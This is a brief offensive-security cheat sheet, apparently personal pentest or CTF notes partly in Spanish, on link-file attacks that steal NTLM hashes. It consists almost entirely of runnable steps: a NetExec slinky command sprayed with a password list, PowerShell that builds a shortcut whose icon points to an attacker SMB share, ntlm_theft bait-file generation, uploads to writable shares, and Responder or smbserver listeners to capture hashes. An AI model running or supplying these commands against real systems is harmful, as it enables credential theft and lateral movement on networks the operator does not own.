# Link File Attacks
- [Link File Attacks](https://www.cyborgsecurity.co.uk/2020/10/09/link-file-attacks/)
- Con NetExec `nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent`

- Manual:
    - Código:

    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\test.lnk")
    $lnk.TargetPath = "\\192.168.138.149\@test.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
    ``` 

    - `smbserver.py -smb2support "icon" .`

## Con NTLM Theft
- `git clone https://github.com/Greenwolf/ntlm_theft`
- `cd ntlm_theft`
- `python3 ntlm_theft.py --generate all --server 10.10.14.48 --filename icon`
- `impacket-smbclient USER:'PASSWORD'@fIP`
    - shares
    - use share con acceso a escritura
- `sudo responder -I tun0` o `impacket-smbserver -smb2support shareName someDir`